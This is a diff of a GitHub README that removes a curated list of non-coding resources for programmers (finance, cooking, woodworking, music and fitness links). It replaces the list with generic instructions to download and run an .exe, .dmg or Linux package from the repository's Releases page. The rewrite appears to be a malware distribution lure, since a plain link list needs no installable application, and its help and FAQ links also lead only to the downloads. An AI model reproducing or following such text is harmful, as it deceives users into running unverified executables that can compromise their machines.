@@ -1,59 +1,78 @@
-![banner](https://github.com/user-attachments/assets/478a8e35-b7fb-4ad2-9b45-45388a0ff637)
-_(Made and animated with 💜 using [StoryMotion](https://storymotion.video/). Maintained by [LearnAlgorithm](https://learnalgorithm.com/))_
+# 🌟 awesome-coders-guide-to-everything-except-coding - Explore Resources Beyond Coding
 
-> A curated list of guides, online courses, articles, and resources for coders, engineers, and nerds that are completely unrelated to coding.
+## 🔗 Download Now
+[![Download](https://img.shields.io/badge/Download%20Here-blue.svg)](https://github.com/MonkeyGTDev/awesome-coders-guide-to-everything-except-coding/releases)
 
-### How to contribute?
+## 📖 Overview
+Welcome to the **awesome-coders-guide-to-everything-except-coding**! This is a curated list of online resources for coders, engineers, and nerds that are completely unrelated to coding. Whether you’re looking for inspiration, learning opportunities, or simply a break from the usual programming tasks, this guide offers a wealth of information across various topics.
 
-Feel free to add resources! You can open an issue with the resource details (Name, Description, Format, Date, Author), or submit a Pull Request following the existing table format.
+## 🚀 Getting Started
+To start using this resource guide, you’ll need to download the latest version from our Releases page. Follow these simple steps to get started, even if you're not a tech expert.
 
-### What belongs in this list?
+## 🛠 System Requirements
+This application should run smoothly on most personal computers. Here are the recommended specifications to ensure a good experience:
 
-- Resources designed specifically for developers.
-- Articles or books written from an engineer's perspective.
-- Websites that explain concepts using first-principles thinking, visualization, or interactivity that piques a nerd's interest.
-- **BUT completely unrelated to coding.**
+- **Operating System:** Windows 10, macOS Mojave or later, or any current Linux distribution.
+- **RAM:** At least 4 GB.
+- **Storage:** Minimum of 250 MB available space.
+- **Internet Connection:** Required for downloading and accessing online resources.
 
-## Table of Contents
-- [💸 Finance](#-finance)
-- [🍵 Food and Drink](#-food-and-drink)
-- [🧶 Craft](#-craft)
-- [🎵 Music](#-music)
-- [💪 Health and Fitness](#-health-and-fitness)
+## 📦 Download & Install
+1. **Visit the Releases Page:**
+   Click on this link to visit the Releases page: [Download Here](https://github.com/MonkeyGTDev/awesome-coders-guide-to-everything-except-coding/releases).
 
-## 💸 Finance
+2. **Choose Your Version:**
+   On the Releases page, you’ll see a list of available versions. Select the latest release. 
 
-|  | Name | Short Description | Format | Published Date | Author |
-| -- | ---| ------ | ------ | ------ | ------ |
-| 💳 | [CS 007: Personal Finance for Engineers](https://cs007.blog/) | CS 007 is an introduction to the fundamentals and analysis specifically needed by engineers to make informed and intelligent financial decisions. | Course | October 11, 2025 | [@adamnash](https://x.com/adamnash) |
-| 🏦 | [The Hacker's Guide to Investors](https://paulgraham.com/guidetoinvestors.html) | “In this essay I'm going to list some of the more surprising things I've learned about investors.” | Article | April 29, 2007| [Paul Graham](https://paulgraham.com/index.html) |
+3. **Download the File:**
+   After choosing your version, look for the download link. You will find files in various formats. Choose the one that fits your operating system (e.g., `.exe` for Windows, `.dmg` for macOS).
 
-## 🍵 Food and Drink
+4. **Install the Application:**
+   a. For **Windows:** 
+   - Double-click the downloaded `.exe` file.
+   - Follow the installation prompts to complete the setup.
 
-|  | Name | Short Description | Format | Published Date | Author |
-| -- | ---| ------ | ------ | ------ | ------ |
-| 👨‍🍳 | [Cooking For Engineers](https://www.cookingforengineers.com/) | Have an analytical mind? Like to cook? This is the site to read! | Website | June 2004 | Michael Chu |
-| 👨‍🍳 | [How To Cook](https://github.com/Anduin2017/HowToCook) | 程序员在家做饭方法指南。Programmer's guide about how to cook at home (Simplified Chinese only) | Website | Feb 29, 2020 | [Anduin Xue](https://github.com/Anduin2017) |
+   b. For **macOS:** 
+   - Open the downloaded `.dmg` file.
+   - Drag the application icon to your Applications folder.
 
-## 🧶 Craft
+   c. For **Linux:** 
+   - Unzip the downloaded file.
+   - Follow the instructions included within the package.
 
-|  | Name | Short Description | Format | Published Date | Author |
-| -- | ---| ------ | ------ | ------ | ------ |
-| 🪑 | [Woodworking for engineers](https://woodgears.ca/) | An engineer's approach to Woodworking | Website | - | [Matthias Wandel](https://woodgears.ca/faq/index.html) |
+5. **Run the Application:**
+   After installation, open the application by finding it in your Programs (Windows), Applications (macOS), or relevant menus (Linux). 
 
-## 🎵 Music
+## 🔍 How to Use the Guide
+Once you have the application running, you can explore various categories of resources. Here’s how to make the most out of it:
 
-|  | Name | Short Description | Format | Published Date | Author |
-| -- | ---| ------ | ------ | ------ | ------ |
-| 🎶 | [Chromatone](https://chromatone.center/) | Visual Music Language to learn, explore and communicate with | Website | - | [@chromatone](https://github.com/chromatone/) |
-| 🔊 | [Sound](https://ciechanow.ski/sound/) | “In this article I’ll explain what sound is, how it’s created and propagated.” | Article | October 18, 2022 | [Bartosz Ciechanowski](https://ciechanow.ski/) |
-| 🎹 | [Music theory for nerds](https://eev.ee/blog/2016/09/15/music-theory-for-nerds/) | “Here is what I gathered, from the perspective of someone whose only music class was learning to play four notes on a recorder in second grade.” | Article | Sep 15, 2016 | [Eevee](https://eev.ee/) |
-| 🎹 | [Music theory that isn't boring](https://www.lightnote.co/) | How Music Works. Interactive Music Theory Lessons | Website/Course | - | [Lightnote](https://www.lightnote.co/) |
+- **Browse Categories:** The main interface presents a list of categories. Click on any category to see the relevant resources.
+- **Search Feature:** Use the search bar to find specific topics or resources quickly.
+- **Bookmark Resources:** If you find something particularly useful, make use of the bookmarking feature to save it for later.
 
+## 📚 Content Overview
+The guide contains various links and descriptions for materials not directly related to coding. Here are examples of what you might find within:
 
-## 💪 Health and Fitness
+- **Lifestyle Articles:** Explore ways to improve your overall well-being.
+- **Educational Platforms:** Discover websites that offer courses in arts, science, and other non-coding subjects.
+- **Creative Inspiration:** Links to art, photography, and design resources that can fuel your creativity.
 
-|  | Name | Short Description | Format | Published Date | Author |
-| -- | ---| ------ | ------ | ------ | ------ |
-| 🥕 | [The Hacker's Diet](https://www.fourmilab.ch/hackdiet/) | A serious book about how to lose weight and permanently maintain whatever weight you desire. | Book | - | [John Walker](https://www.fourmilab.ch/) |
-| 💪 | [A Developers Guide to Getting Fit](https://dev.to/httpjunkie/a-developers-guide-to-getting-fit-pif) | “This article is about intermittent fasting” | Article | Feb 10, 2019 | [Eric Bishard](https://dev.to/httpjunkie) |
+## ✨ Tips for Effective Browsing
+- **Set Objectives:** Before diving in, decide what you want to learn or explore.
+- **Take Notes:** Keep a notebook or digital document handy to jot down thoughts or interesting findings.
+- **Share Resources:** If you find valuable content, share it with peers or on social media platforms.
+
+## 📞 Get Help
+If you face any issues during download or installation, help is available. You can:
+
+- Check the [FAQs](https://github.com/MonkeyGTDev/awesome-coders-guide-to-everything-except-coding/releases), which cover common questions.
+- Reach out on the GitHub Issues page for assistance. Your feedback helps improve the guide.
+
+## 💡 Stay Updated
+To stay informed about the latest updates:
+
+- Regularly check the [Releases page](https://github.com/MonkeyGTDev/awesome-coders-guide-to-everything-except-coding/releases).
+- Follow the repository to receive notifications about new releases.
+
+## 🌟 Final Notes
+This guide is a valuable resource for anyone interested in broadening their horizons beyond coding. Enjoy your exploration, and make the most of the curated information!
